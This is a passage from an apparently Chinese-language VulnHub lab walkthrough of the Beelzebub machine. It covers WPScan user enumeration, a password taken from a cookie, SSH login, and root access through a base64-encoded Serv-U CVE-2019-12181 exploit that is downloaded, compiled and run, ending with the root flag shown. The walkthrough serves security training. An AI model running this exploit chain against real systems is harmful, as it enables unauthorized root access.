-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Enumerating Medias <span style=color:#ff6ac1>(</span>via Passive and Aggressive Methods<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>(</span>Permalink setting must be <span style=color:#ff5c57>set</span> to <span style=color:#5af78e>&#34;Plain&#34;</span> <span style=color:#ff6ac1>for</span> those to be detected<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> Brute Forcing Attachment IDs - Time: 00:00:04 &lt;<span style=color:#ff6ac1>=====================================</span>&gt; <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>100</span> / 100<span style=color:#ff6ac1>)</span> 100.00% Time: 00:00:04
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> Medias<span style=color:#ff6ac1>(</span>s<span style=color:#ff6ac1>)</span> Identified:
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>38</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>39</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>42</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>44</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>48</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>49</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>51</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>75</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>74</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>77</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>96</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/?attachment_id<span style=color:#ff6ac1>=</span><span style=color:#ff9f43>99</span>
-</span></span><span style=display:flex><span> | Found By: Attachment Brute Forcing <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Enumerating Users <span style=color:#ff6ac1>(</span>via Passive and Aggressive Methods<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> Brute Forcing Author IDs - Time: 00:00:00 &lt;<span style=color:#ff6ac1>===========================================</span>&gt; <span style=color:#ff6ac1>(</span><span style=color:#ff9f43>10</span> / 10<span style=color:#ff6ac1>)</span> 100.00% Time: 00:00:00
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>i<span style=color:#ff6ac1>]</span> User<span style=color:#ff6ac1>(</span>s<span style=color:#ff6ac1>)</span> Identified:
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> valak
-</span></span><span style=display:flex><span> | Found By: Author Id Brute Forcing - Author Pattern <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> | Confirmed By: Login Error Messages <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> krampus
-</span></span><span style=display:flex><span> | Found By: Author Id Brute Forcing - Author Pattern <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span> | Confirmed By: Login Error Messages <span style=color:#ff6ac1>(</span>Aggressive Detection<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>!<span style=color:#ff6ac1>]</span> No WPScan API Token given, as a result vulnerability data has not been output.
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>!<span style=color:#ff6ac1>]</span> You can get a free API token with <span style=color:#ff9f43>25</span> daily requests by registering at https://wpscan.com/register
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Finished: Mon Jan <span style=color:#ff9f43>19</span> 00:51:58 <span style=color:#ff9f43>2026</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Requests Done: <span style=color:#ff9f43>10929</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Cached Requests: <span style=color:#ff9f43>11</span>
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Data Sent: 3.643 MB
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Data Received: 1.627 MB
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Memory used: 206.777 MB
-</span></span><span style=display:flex><span><span style=color:#ff6ac1>[</span>+<span style=color:#ff6ac1>]</span> Elapsed time: 00:01:01</span></span></code></pre></div><ul><li><code>-e</code>是<code>--enumerate</code>的缩写，告诉WPScan区枚举慕白哦网站的特定信息；<code>--ignore-main-redirect</code>强制WPScan忽略服务器发出的重定向请求；<code>--plugins-detection aggressive</code>深度探测，默认探测只看页面源代码，积极模式会主动请求插件路径；<code>--force</code>强制执行，WPScan忽略一些非致命的警告</li><li><code>wpscan --url http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/ -e --plugins-detection aggressive --ignore-main-redirect --force</code>，其中<code>--plugins-detection aggressive</code>针对插件，而没有用<code>--users-detection aggressive</code>针对用户账号，可以同时用<code>--users-detection aggressive --plugins-detection aggressive</code>实现激进枚举用户+激进枚举插件，但会增加耗时。</li><li>得到合法的后台用户名<code>valak</code>和<code>krampus</code>，只要匹配密码就可登录。</li></ul><p>接着检查/wp-content/uploads/有无相关文件http://192.168.242.230/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/
-结果发现一个<code>Talk To VALAK/</code>文件夹，F12进入网络模式，输入任意一个数字，返回的状态200，方法post，文件index.php，其返回的cookie中含有密码</p><pre tabindex=0><code>M4k3Ad3a1</code></pre><p>尝试登录</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ ssh krampus@192.168.242.230
-</span></span><span style=display:flex><span>** WARNING: connection is not using a post-quantum key exchange algorithm.
-</span></span><span style=display:flex><span>** This session may be vulnerable to <span style=color:#5af78e>&#34;store now, decrypt later&#34;</span> attacks.
-</span></span><span style=display:flex><span>** The server may need to be upgraded. See https://openssh.com/pq.html
-</span></span><span style=display:flex><span>krampus@192.168.242.230<span style=color:#ff5c57>&#39;</span>s password: 
-</span></span><span style=display:flex><span>Welcome to Ubuntu 18.04.4 LTS <span style=color:#ff6ac1>(</span>GNU/Linux 5.3.0-53-generic x86_64<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span> * Documentation:  https://help.ubuntu.com
-</span></span><span style=display:flex><span> * Management:     https://landscape.canonical.com
-</span></span><span style=display:flex><span> * Support:        https://ubuntu.com/advantage
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span> * Canonical Livepatch is available <span style=color:#ff6ac1>for</span> installation.
-</span></span><span style=display:flex><span>   - Reduce system reboots and improve kernel security. Activate at:
-</span></span><span style=display:flex><span>     https://ubuntu.com/livepatch
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#ff9f43>294</span> packages can be updated.
-</span></span><span style=display:flex><span><span style=color:#ff9f43>178</span> updates are security updates.
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Your Hardware Enablement Stack <span style=color:#ff6ac1>(</span>HWE<span style=color:#ff6ac1>)</span> is supported <span style=color:#ff6ac1>until</span> April 2023.
-</span></span><span style=display:flex><span>Last login: Wed Jun <span style=color:#ff9f43>11</span> 17:35:43 <span style=color:#ff9f43>2025</span> from 192.168.188.6
-</span></span><span style=display:flex><span>krampus@beelzebub:~$</span></span></code></pre></div><p>成功登录</p><h2 id=提权>提权<a class=anchor href=#%e6%8f%90%e6%9d%83>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>krampus@beelzebub:~$ cat .Serv-U-Tray.conf
-</span></span><span style=display:flex><span>Theme Number0krampus@beelzebub:~$ -U Tray<span style=color:#5af78e>\T</span>hemes
-</span></span><span style=display:flex><span>krampus@beelzebub:~$ cat .bash_history
-</span></span><span style=display:flex><span>mysql -u root -p
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>lks
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>nano /etc/host
-</span></span><span style=display:flex><span>nano /etc/hosts <span style=color:#78787e># 系统本地的 DNS 映射表，可以绕过公共DNS解析、测试本地站点、屏蔽恶意网站</span>
-</span></span><span style=display:flex><span>su root <span style=color:#78787e># 切换到root超级用户身份</span>
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>rm -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip 
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span><span style=color:#ff5c57>exit</span>
-</span></span><span style=display:flex><span>chmod <span style=color:#ff9f43>0750</span> html/
-</span></span><span style=display:flex><span>ifconfig
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> /var/lib/mysql/
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> wordpress/
-</span></span><span style=display:flex><span>sudo su
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> Desktop/
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>cat user.txt 
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>uname -a
-</span></span><span style=display:flex><span>sudo -1
-</span></span><span style=display:flex><span>sudo -i
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>uname -a
-</span></span><span style=display:flex><span>sudo -i
-</span></span><span style=display:flex><span>find / -prem -u<span style=color:#ff6ac1>=</span>s -type f 2&gt;/dev/null
-</span></span><span style=display:flex><span>find / -prem -u<span style=color:#ff6ac1>=</span>s -type f 2&gt;/dev/null
-</span></span><span style=display:flex><span>cat /etc/issue
-</span></span><span style=display:flex><span>sudo -l
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> ../
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> ../../../../
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>find / -prem -u<span style=color:#ff6ac1>=</span>s -type f 2&gt;/dev/null
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> /usr/local/Serv-U/
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span>
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ps -aux
-</span></span><span style=display:flex><span>ps -a
-</span></span><span style=display:flex><span>ps -a -U root
-</span></span><span style=display:flex><span>ps -a -U root | grep <span style=color:#5af78e>&#39;Serv&#39;</span>
-</span></span><span style=display:flex><span>ps -U root -au
-</span></span><span style=display:flex><span>ps -U root -au | sort -u
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> /tmp/
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>find / -prem -u<span style=color:#ff6ac1>=</span>s -type f 2&gt;/dev/null
-</span></span><span style=display:flex><span>find / -perm -u<span style=color:#ff6ac1>=</span>s -type f 2&gt;/dev/null
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>find / -perm -u<span style=color:#ff6ac1>=</span>s -type f 2&gt;/dev/null
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>wget https://www.exploit-db.com/download/47009
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>mv <span style=color:#ff9f43>47009</span> ./exploit.c <span style=color:#78787e># mv可以移动或重命名，./表示当前目录，exploit.c是新的文件名，即将47009重命名为当前目录下的exploit.c</span>
-</span></span><span style=display:flex><span>gcc exploit.c -o exploit
-</span></span><span style=display:flex><span>./exploit 
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> ../../../../../../../
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> <span style=color:#ff5c57>cd</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span>
-</span></span><span style=display:flex><span>grep -r <span style=color:#5af78e>&#39;beelzebub&#39;</span>
-</span></span><span style=display:flex><span>grep -r <span style=color:#5af78e>&#39;love&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> .local/share
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> Trash/
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>cat info
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> info
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>ls -la
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> ../
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> ../
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>rm -rf Trash/
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span><span style=color:#ff5c57>history</span> -R
-</span></span><span style=display:flex><span><span style=color:#ff5c57>history</span> -r
-</span></span><span style=display:flex><span>mysql -u root -p
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>lks
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>nano /etc/host
-</span></span><span style=display:flex><span>nano /etc/hosts
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>rm -rf sudo-1.9.6p1 sudo-1.9.6p1.tar.gz wordpress-5.3.2.zip 
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span><span style=color:#ff5c57>exit</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>history</span>
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span>
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ip link
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span><span style=color:#ff5c57>history</span>
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span><span style=color:#ff5c57>cd</span> /tmp/
-</span></span><span style=display:flex><span>ls
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span><span style=color:#ff5c57>exit</span>
-</span></span><span style=display:flex><span>clear
-</span></span><span style=display:flex><span>cat /etc/systemd/system/LingJingCmd.service
-</span></span><span style=display:flex><span>vi /etc/network/interfaces
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>ip addr
-</span></span><span style=display:flex><span>su root
-</span></span><span style=display:flex><span>quit
-</span></span><span style=display:flex><span><span style=color:#ff5c57>help</span>
-</span></span><span style=display:flex><span><span style=color:#ff5c57>exit</span>
-</span></span><span style=display:flex><span>exit</span></span></code></pre></div><ul><li>第一个命令查看<code>.Serv-U-Tray.conf</code>的隐藏配置文件内容，Serv-U是一款非常著名的FTP服务器软件</li><li><code>-U Tray\Themes </code>不是一个有效的命令，由于上一个<code>cat</code>命令输出的内容没有换行，导致命令提示符紧跟在内容后面，</li><li>第二个命令查看当前用户<code>krampus</code>的命令历史记录，得知目标运行servU，且在历史记录中找到了漏洞利用代码的位置</li></ul><pre tabindex=0><code>wget https://www.exploit-db.com/download/47009</code></pre><ul><li>将文件下载到kali linux的<code>/home/kali</code>（或者用波浪号<code>~</code>表示），再将文件名字修改为<code>47009.c</code></li><li>由于kali linux的ip为<code>192.168.203.129</code>，而靶机ip为lingjing实验室环境分配的<code>192.168.242.230</code>，两者网段不匹配，因此可以采用绕过回传限制的方法，<strong>Base64编码</strong></li></ul><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-zsh data-lang=zsh><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
-</span></span><span style=display:flex><span>└─$ base64 47009.c -w <span style=color:#ff9f43>0</span>
-</span></span><span style=display:flex><span>LyoNCg0KQ1ZFLTIwMTktMTIxODEgU2Vydi1VIDE1LjEuNiBQcml2aWxlZ2UgRXNjYWxhdGlvbiANCg0KdnVsbmVyYWJpbGl0eSBmb3VuZCBieToNCkd1eSBMZXZpbiAoQHZhX3N0YXJ0IC0gdHdpdHRlci5jb20vdmFfc3RhcnQpIGh0dHBzOi8vYmxvZy52YXN0YXJ0LmRldg0KDQp0byBjb21waWxlIGFuZCBydW46DQpnY2Mgc2VydnUtcGUtY3ZlLTIwMTktMTIxODEuYyAtbyBwZSAmJiAuL3BlDQoNCiovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQoNCmludCBtYWluKCkNCnsgICAgICAgDQogICAgY2hhciAqdnVsbl9hcmdzW10gPSB7IlwiIDsgaWQ7IGVjaG8gJ29wZW5pbmcgcm9vdCBzaGVsbCcgOyAvYmluL3NoOyBcIiIsICItcHJlcGFyZWluc3RhbGxhdGlvbiIsIE5VTEx9Ow0KICAgIGludCByZXRfdmFsID0gZXhlY3YoIi91c3IvbG9jYWwvU2Vydi1VL1NlcnYtVSIsIHZ1bG5fYXJncyk7DQogICAgLy8gaWYgZXhlY3YgaXMgc3VjY2Vzc2Z1bCwgd2Ugd29uJ3QgcmVhY2ggaGVyZQ0KICAgIHByaW50ZigicmV0IHZhbDogJWQgZXJybm86ICVkXG4iLCByZXRfdmFsLCBlcnJubyk7DQogICAgcmV0dXJuIGVycm5vOw0KfQ<span style=color:#ff6ac1>==</span>  </span></span></code></pre></div><p><code>-w</code>全写<code>--wrap</code>，指定编码后每行最多多少字符，而<code>0</code>表示不换行（禁用自动换行），输出的Base64字符串是一整行</p><p>在靶机krampus的shell中运行：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>krampus@beelzebub:~$ <span style=color:#ff5c57>cd</span> /tmp
-</span></span><span style=display:flex><span>krampus@beelzebub:/tmp$ <span style=color:#ff5c57>echo</span> <span style=color:#5af78e>&#34;LyoNCg0KQ1ZFLTIwMTktMTIxODEgU2Vydi1VIDE1LjEuNiBQcml2aWxlZ2UgRXNjYWxhdGlvbiANCg0KdnVsbmVyYWJpbGl0eSBmb3VuZCBieToNCkd1eSBMZXZpbiAoQHZhX3N0YXJ0IC0gdHdpdHRlci5jb20vdmFfc3RhcnQpIGh0dHBzOi8vYmxvZy52YXN0YXJ0LmRldg0KDQp0byBjb21waWxlIGFuZCBydW46DQpnY2Mgc2VydnUtcGUtY3ZlLTIwMTktMTIxODEuYyAtbyBwZSAmJiAuL3BlDQoNCiovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQoNCmludCBtYWluKCkNCnsgICAgICAgDQogICAgY2hhciAqdnVsbl9hcmdzW10gPSB7IlwiIDsgaWQ7IGVjaG8gJ29wZW5pbmcgcm9vdCBzaGVsbCcgOyAvYmluL3NoOyBcIiIsICItcHJlcGFyZWluc3RhbGxhdGlvbiIsIE5VTEx9Ow0KICAgIGludCByZXRfdmFsID0gZXhlY3YoIi91c3IvbG9jYWwvU2Vydi1VL1NlcnYtVSIsIHZ1bG5fYXJncyk7DQogICAgLy8gaWYgZXhlY3YgaXMgc3VjY2Vzc2Z1bCwgd2Ugd29uJ3QgcmVhY2ggaGVyZQ0KICAgIHByaW50ZigicmV0IHZhbDogJWQgZXJybm86ICVkXG4iLCByZXRfdmFsLCBlcnJubyk7DQogICAgcmV0dXJuIGVycm5vOw0KfQ==&#34;</span> | base64 -d &gt; /tmp/47009.c
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>krampus@beelzebub:/tmp$ ls -l /tmp/47009.c
-</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#ff9f43>1</span> krampus krampus <span style=color:#ff9f43>619</span> Jun <span style=color:#ff9f43>11</span> 18:23 /tmp/47009.c
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>krampus@beelzebub:/tmp$ gcc -o exploit 47009.c
-</span></span><span style=display:flex><span>krampus@beelzebub:/tmp$ ./exploit
-</span></span><span style=display:flex><span><span style=color:#ff5c57>uid</span><span style=color:#ff6ac1>=</span>0<span style=color:#ff6ac1>(</span>root<span style=color:#ff6ac1>)</span> <span style=color:#ff5c57>gid</span><span style=color:#ff6ac1>=</span>0<span style=color:#ff6ac1>(</span>root<span style=color:#ff6ac1>)</span> <span style=color:#ff5c57>groups</span><span style=color:#ff6ac1>=</span>0<span style=color:#ff6ac1>(</span>root<span style=color:#ff6ac1>)</span>,4<span style=color:#ff6ac1>(</span>adm<span style=color:#ff6ac1>)</span>,24<span style=color:#ff6ac1>(</span>cdrom<span style=color:#ff6ac1>)</span>,30<span style=color:#ff6ac1>(</span>dip<span style=color:#ff6ac1>)</span>,33<span style=color:#ff6ac1>(</span>www-data<span style=color:#ff6ac1>)</span>,46<span style=color:#ff6ac1>(</span>plugdev<span style=color:#ff6ac1>)</span>,116<span style=color:#ff6ac1>(</span>lpadmin<span style=color:#ff6ac1>)</span>,126<span style=color:#ff6ac1>(</span>sambashare<span style=color:#ff6ac1>)</span>,1000<span style=color:#ff6ac1>(</span>krampus<span style=color:#ff6ac1>)</span>
-</span></span><span style=display:flex><span>opening root shell
-</span></span><span style=display:flex><span><span style=color:#78787e># cd /root</span>
-</span></span><span style=display:flex><span><span style=color:#78787e># ls</span>
-</span></span><span style=display:flex><span>root.txt
-</span></span><span style=display:flex><span><span style=color:#78787e># cat root.txt</span>
-</span></span><span style=display:flex><span>8955qpasq8qq807879p75e1rr24cr1a5</span></span></code></pre></div><ul><li><code>gcc</code>是linux的c语言编译器，<code>-o</code>是输出参数，<code>exploit</code>是生成的文件名字，源代码是<code>47009.c</code></li><li><code>./exploit</code>是运行当前目录下可执行文件，<code>.</code>代表"当前所在的目录"，<code>/</code>代表路径分隔符</li><li><code>uid=0(root)</code>代表身份是超级管理员，<code>gid=0(root)</code>代表现在属于root管理组，<code>groups</code>显示除了root组外，还保留原用户<code>krampus</code>所在的组（<code>adm</code>，<code>cdrom</code>，<code>sudo</code>），这是因为提权脚本劫持父进程权限，在当前会话中产生了一个具有root权限的子shell</li><li><code>opening root shell</code>是<code>47009.c</code>脚本中<code>printf</code>函数输出的一行文字，命令提示符从<code>$</code>变为<code>#</code>，代表root</li><li>接着读取/root/root.txt中的root flag</li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/vnccer/vnccer.github.io/commit/f3118057084fd8b2fe3a55f39976eb54236450cb title='Last modified by vnccer | May 15, 2026' target=_blank rel=noopener><img src=/icons/calendar.svg class=book-icon alt=Calendar>
-<span>May 15, 2026</span></a></div><div></div></div><div class="flex flex-wrap justify-between"><span><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/ class="flex align-center"><img src=/icons/backward.svg class=book-icon alt=Backward>
-<span>doubletrouble: 1</span>
-</a></span><span><a href=/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/ class="flex align-center"><span>Empire Breakout</span>
